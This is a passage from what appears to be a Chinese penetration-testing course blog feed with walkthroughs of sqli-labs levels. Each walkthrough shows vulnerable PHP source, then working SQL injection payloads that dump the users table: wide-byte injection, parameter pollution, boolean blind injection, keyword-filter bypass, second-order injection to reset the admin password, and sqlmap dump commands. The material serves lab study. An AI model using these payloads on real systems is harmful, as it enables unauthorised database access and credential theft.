punctuation">(</span>column_name<span class="token punctuation">)</span> from infoorrmation_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> aandnd <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>--+爆破字段内容<span class="token parameter variable">-1</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,passwoorrd<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less32</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less32/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> check_addslashes<span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$string</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token builtin class-name">.</span> preg_quote<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span> <span class="token builtin class-name">.</span><span class="token string">'/'</span>, <span class="token string">"<span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span>"</span>, <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          //escape any backslash    <span class="token variable">$string</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/\'</span>/i<span class="token string">', '</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span>'<span class="token string">', $string);                               //escape single quote with a backslash    $string = preg_replace('</span>/<span class="token punctuation">\</span>"/<span class="token string">', "\\\"", $string);                                //escape double quote with a backslash              return $string;}mysql_query("SET NAMES gbk");$sql="SELECT * FROM users WHERE id='</span><span class="token variable">$id</span>' LIMIT <span class="token number">0,1</span>"<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>** 宽字节注入<strong>，利用mysql使用GBK编码,将两个字符看作一个汉字的特性，<br>消除转义符号””，使单引号成功逃逸出来。get型宽字节</strong>%df’**</p><p><a name="Oqn0G"></a></p><h1 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h1><p><code>1'</code></p><blockquote><p>Hint: The Query String you input is escaped as : 1’<br>The Query String you input in Hex becomes : 315c27</p></blockquote><p>单引号<strong>被转义</strong>了。</p><p><code>**?id=1%df'** and 1=1--+</code></p><blockquote><p>Hint: The Query String you input is escaped as : 1�’ and 1=1–<br>The Query String you input in Hex becomes : 31df5c2720616e6420313d312d2d20</p></blockquote><p>通过页面的回显发现确实存在宽字节注入</p><p><code>输入?id=1 and 1=2，经过站长工具检验，3120616e6420313d32就是1 and 1=2的**16进制编码**</code> <a name="lZ5eZ"></a></p><h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p><code>?id=1%df' and 1=1 order by 4--+ </code></p><blockquote><p>Unknown column ‘4’ in ‘order clause’<br>没有第4列</p></blockquote><p><code>?id=1%df' and 1=1 order by 3--+ </code>正常回显<br>有3列 <a name="nkL2x"></a></p><h1 id="找回显点"><a href="#找回显点" class="headerlink" title="找回显点"></a>找回显点</h1><p><code>?id=1%df' and 1=2 union select 1,2,3--+</code> &amp;#x20;<br>显示2，3是回显点</p><p><a name="Fo51J"></a></p><h1 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h1><p><code>?id=1%df' and 1=2 union select 1,2,database()--+</code> <a name="mfEoD"></a></p><h1 id="爆破数据库表名称"><a href="#爆破数据库表名称" class="headerlink" title="爆破数据库表名称"></a>爆破数据库表名称</h1><p><code>?id=1%df' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</code> <a name="UUMj0"></a></p><h1 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h1><p>因为’users’中单引号会被转义，因此采取十六进制代替’users’<br><strong>users的16进制是0x7573657273</strong><br><code>?id=1%df' and 1=2 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code> <a name="uMeKf"></a></p><h1 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h1><p><code>?id=1%df' and 1=2 union select 1,2,(select group_concat(username,0x7e,password) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less29</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less29/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>This Site Protected byWorld’s Best Firewell<br>本网站受世界最佳防火墙保护</p></blockquote><p><code>**?id=1&amp;id=2**</code></p><blockquote><p>Your Login name:Angelina<br>Your Password:I-kill-you</p></blockquote><p>服务器端有两个部分：<br>第一部分是tomcat为引擎的jsp型服务器，<br>第二部分是apache为引擎的php服务器，<br>真正提供web服务的是php服务器,<br>往往在tomcat的服务器处做过滤处理，功能类似于waf，<br>由于解析参数的机制不同，我们可以利用该原理绕过waf的检测;<br>数据解析的顺序：tomcat从前往后， <strong>appache从后往前</strong>。\ <a name="ohpIT"></a></p><h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p><a name="iQW9u"></a></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><blockquote><p><strong>?id=1&amp;id=0’</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看当前数据库名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,(select database()) --+查看数据表名称?id=1&amp;id=0'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+爆破字段名称?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">0</span><span class="token string">' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">')--+爆破字段内容 ?id=1&amp;id=0'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span>from security.users <span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less28</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less28/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('<span class="token variable">$id</span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[\/*]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//strip out /*<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[--]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out --.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[#]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//Strip out <span class="token comment">#.</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.//<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/select/m'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/[ +]/'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out spaces.<span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/union\s+select/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Strip out UNION <span class="token operator">&amp;</span> SELECT.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>union 和 select</strong> <strong>的组合</strong>被过滤了。</p><blockquote><p>All Your’UNION’and’SIETICT’ belong to us.</p></blockquote><p>提示union和select被过滤。</p><p><code>1'</code> 现没有报错回显 &amp;#x20;<br><code>1')and'1'=('1</code>成功闭合<br>没有报错回显，就使用布尔盲注 <a name="EfVmh"></a></p><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>经过测试发现单独输入select和union时候，不会被过滤掉</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断库长<span class="token number">1</span><span class="token string">')and(length(database())=8)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>返回正常,数据库长度为8逐一字符判断数据库名称<span class="token number">1</span><span class="token string">')and(ascii(substr((database()),1,1))=115)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>返回正常,s<span class="token punctuation">..</span>.判断数据表长度<span class="token number">1</span><span class="token string">')and(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显数据表串起来长为29<span class="token punctuation">..</span>.逐一字符判断数据表名称<span class="token number">1</span><span class="token string">')and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))=101)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显,e<span class="token punctuation">..</span>.判断列长<span class="token number">1</span><span class="token string">')and(length((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='</span><span class="token function">users</span><span class="token string">')))=20)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显,列长串起来是为20<span class="token punctuation">..</span>.逐一字符判断字段名称<span class="token number">1</span><span class="token string">')and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='</span><span class="token function">users</span><span class="token string">')),1,1))=105)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>正常回显,i<span class="token punctuation">..</span>.逐一字符判断字段内容<span class="token number">1</span><span class="token string">')and(ascii(substr((select(group_concat(username,0x7e,password))from(users)),1,1))=68)||'</span><span class="token number">1</span><span class="token string">'=('</span><span class="token number">1</span>显示正常,D<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less25</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less25/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/or/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token string">'/AND/i'</span>,<span class="token string">""</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Alll Your ‘OR’ and AND’ belong to us.</p></blockquote><p>‘and’,’or’和’AND’,’OR’被<strong>过滤</strong> <a name="VYZoO"></a></p><h1 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h1><p><code>?id=1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>可看出是**单引号’**闭合 <a name="ua3BP"></a></p><h1 id="测试字段数"><a href="#测试字段数" class="headerlink" title="测试字段数"></a>测试字段数</h1><p><code>1' order by 4 --+</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘der by 4– ‘ LIMIT 0,1’ at line 1</p></blockquote><p>or被过滤了。换大写试试。<br><code>1' ORder by 4 --+</code><br>同样的报错，看来大写也被过滤了。试试双写or ‘oorr’<br><code>1' oorrder by 4--+</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>Unknown column ‘4’ in ‘order clause’</p></blockquote><p>没有第4列<br><code>1' oorrder by 3--+</code>返回正常<br>有3个字段。</p><p><a name="tls7t"></a></p><h1 id="检查回显点"><a href="#检查回显点" class="headerlink" title="检查回显点"></a>检查回显点</h1><p><code>-1' union select 1,2,3-- +</code><br>显示2，3是回显点 <a name="DJ9KV"></a></p><h1 id="爆破数据库名称"><a href="#爆破数据库名称" class="headerlink" title="爆破数据库名称"></a>爆破数据库名称</h1><p><code>-1' union select 1,2,(select database())-- +</code> <a name="yJOW1"></a></p><h1 id="爆破数据表"><a href="#爆破数据表" class="headerlink" title="爆破数据表"></a>爆破数据表</h1><p><code>-1' union select 1,2,(select group_concat(table_name) from info**or**rmation_schema.tables where table_schema=database())--+</code> <a name="za0hf"></a></p><h1 id="爆破字段名称"><a href="#爆破字段名称" class="headerlink" title="爆破字段名称"></a>爆破字段名称</h1><p><code>-1' union select 1,2,(select group_concat(column_name) form info**or**rmation_schema.cloumns where table_schema=database() and table_name='users')--+</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-25\index.php</strong> on line <strong>37</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘table_name=’users’)– ‘ LIMIT 0,1’ at line 1</p></blockquote><p>and 被过滤了，双写and    ‘aandnd’<br><code>-1' union select 1,2,(select group_concat(column_name) from info**or**rmation_schema.columns where table_schema=database() a**and**nd table_name='users')--+</code> <a name="qEq7I"></a></p><h1 id="爆破字段内容"><a href="#爆破字段内容" class="headerlink" title="爆破字段内容"></a>爆破字段内容</h1><p><code>-1' union select 1,2,(select group_concat(username,0x7e,passwo**or**rd) from users)--+</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less24</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less24/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less24/</url>
      
        <content type="html"><![CDATA[<p><a name="Zvqbq"></a></p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into users ( username, password) values(<span class="token entity" title="\&quot;">\"</span><span class="token variable">$username</span><span class="token entity" title="\&quot;">\"</span>, <span class="token entity" title="\&quot;">\"</span><span class="token variable">$pass</span><span class="token entity" title="\&quot;">\"</span>)"</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='<span class="token variable">$pass</span>' where username='<span class="token variable">$username</span>' and password='<span class="token variable">$curr_pass</span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>二次注入</strong>：二次注入是存储型注入。<br>可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。<br>恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，<br>当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p></blockquote><p>比如输入了admin’ #，网站则会将’和#转义后进行SQL查询，<br>但是最后存入数据库中的结果仍然是admin’ #（并没有转义存储）。</p><blockquote><p>简言之就是将脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，<br>当下一次调用该数据时，该数据就会拼接到其他查询语句中造成注入。</p></blockquote><p><img src="/../../assets/ni93xt8pwhh5ruwc/1668606367726-3c955835-31b2-4e4c-bbce-4a10e4212514.png" alt="image.png"> <a name="tu84T"></a></p><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>首先注册一个新的账号，然后登录该账号&amp;#x20;<br><img src="/../../assets/ni93xt8pwhh5ruwc/1668650181397-1d948aa0-e337-454b-8c7e-f3988e2dae40.png" alt="image.png"><br>然后登录该账号&amp;#x20;<br><img src="/../../assets/ni93xt8pwhh5ruwc/1668651240933-a972cf98-6d8b-451b-88d8-1994838d73a2.png" alt="image.png"><br><code>**admin'-- +**</code> <a name="HPMiU"></a></p><h2 id="登录修改密码"><a href="#登录修改密码" class="headerlink" title="登录修改密码"></a>登录修改密码</h2><p>登录之后，修改密码，<br>该修改密码功能的语句变为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'$pass'</span> where <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">'admin'</span>-- +<span class="token string">'and password='</span><span class="token variable">$curr_pass</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么真正奏效的语句则是</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UPDATE <span class="token function">users</span> SET <span class="token assign-left variable">PASSWORD</span><span class="token operator">=</span><span class="token string">'$pass'</span> WHERE <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这时候我们就是在进行越权改变管理员的密码，<br>从数据库中抽出我们注册的新账户，用该账户越权修改 管理员的密码 &amp;#x20;<br><img src="/../../assets/ni93xt8pwhh5ruwc/1668651533559-bc5112bd-3656-49d1-af60-a80f5a8b4cb0.png" alt="image.png"><br>将密码改为<strong>1234</strong>，</p><blockquote><p>Password successfully updated</p></blockquote><p>然后用管理员的账户，登录密码1234 &amp;#x20;<br><img src="/../../assets/ni93xt8pwhh5ruwc/1668651459102-54e393e7-5449-4f4c-acb4-a55b8fbcd7f8.png" alt="image.png"><br>&amp;#x20;管理员账户登录成功</p><p><img src="/./../../asset/1.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less23</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less23/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/advanced-injections/less23/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">"/#/"</span><span class="token punctuation">;</span><span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string">"/--/"</span><span class="token punctuation">;</span><span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token variable">$reg</span>, <span class="token variable">$replace</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> preg_replace<span class="token punctuation">(</span><span class="token variable">$reg1</span>, <span class="token variable">$replace</span>, <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过源码发现**#和–都被被过滤为空字符串**<br>只有想方法将闭合符号消耗完毕，让后台能够接收，处理掉原有的闭合方式 单引号’</p><blockquote><p>Please input the ID as parameter with numeric value</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">id</span><span class="token operator">=</span>-1<span class="token string">' or updatexml(1,concat(0x7e,(select database()),0x7e),1) and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>**and '1'='1**</code>将后面的单引号闭合消耗完毕。</p><p>按照常规get型传参注入 <a name="rL8Hl"></a></p><h1 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h1><p><code>?id=1'</code></p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>E:\phpstudy_pro\WWW\sql.com\Less-23\index.php</strong> on line <strong>38</strong><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>闭合方式单引号’ <a name="lh1Tf"></a></p><h1 id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h1><p><code>?id=1' order by 4 **and '1'='1**</code><br><code>?id=1' order by 3 **and '1'='1**</code><br>字段 3个 <a name="sFNaN"></a></p><h1 id="判断回显点"><a href="#判断回显点" class="headerlink" title="判断回显点"></a>判断回显点</h1><p><code>?id=-1' union select 1,2,**'3**</code><br>回显点2,3 <a name="xvLPE"></a></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查看所有数据库名称?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select database()),'</span><span class="token number">3</span> 查看使用数据表名称?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'</span><span class="token number">3</span>查看字段名?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'),'</span><span class="token number">3</span>查看字段?id<span class="token operator">=</span>-1<span class="token string">' union select 1,(select group_concat(username,0x7e,password) from users),'</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a name="iqiEO"></a></p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">探测注入点sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span>爆破数据库名sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> --current-db爆破数据表sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">--tables</span> 脱库sqlmap <span class="token parameter variable">-u</span> http://192.168.31.193/Less-23/?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> security <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>6.2SQL注入之sqlmap使用(post注入)</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.2sql-zhu-ru-zhi-sqlmap-shi-yong-post-zhu-ru/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/6-sql-zhu-ru-zhi-sqlmap/6.2sql-zhu-ru-zhi-sqlmap-shi-yong-post-zhu-ru/</url>
      
